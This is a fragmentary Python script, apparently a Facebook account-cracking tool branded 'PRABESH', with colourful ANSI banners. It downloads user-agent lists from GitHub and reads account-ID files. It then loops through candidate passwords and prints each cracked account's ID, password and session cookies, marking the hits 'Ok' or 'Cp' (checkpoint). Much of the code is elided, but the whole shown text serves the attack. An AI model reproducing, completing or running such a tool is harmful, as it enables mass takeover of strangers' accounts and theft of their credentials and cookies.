...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mPRABESH')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/PRABESH-143/Ua.txt').text
		ua=open('.bbnew.txt','w')
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO PRABESH FIRE (🔥)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [ 9999+] FIRE (🔥)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/PRABESH.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#PRABESH-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•PRABESH-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#PRABESH-King
				print(f'\r\033[0;92m[PRABESH-➼-Ok 💗 ] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
